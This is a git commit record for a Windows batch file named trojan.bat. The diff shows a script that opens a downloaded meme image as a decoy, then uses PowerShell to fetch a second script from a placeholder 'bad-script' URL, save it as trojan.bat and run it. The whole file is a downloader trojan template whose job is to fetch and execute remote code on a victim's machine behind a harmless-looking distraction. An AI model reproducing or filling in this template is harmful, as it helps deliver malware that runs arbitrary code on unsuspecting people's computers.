d0b5499b3486ab16c733babd8a745e7fd2d9030d
Cimorexave <sadeq.s502@gmail.com>
2022-11-25 14:31:36 +0330

    bad script url desc

--- trojan.bat
+++ trojan.bat
@@ -33,5 +33,5 @@
 cd %TEMP%
 PowerShell -Command "Invoke-WebRequest 'https://static01.nyt.com/images/2021/04/30/multimedia/30xp-meme/29xp-meme-superJumbo-v3.jpg?quality=75&auto=webp' -Outfile lol.png"
 lol.png
-PowerShell -Command "Invoke-WebRequest '' -Outfile trojan.bat"
+PowerShell -Command "Invoke-WebRequest 'your bad-script file url to be downloaded' -Outfile trojan.bat"
 trojan.bat
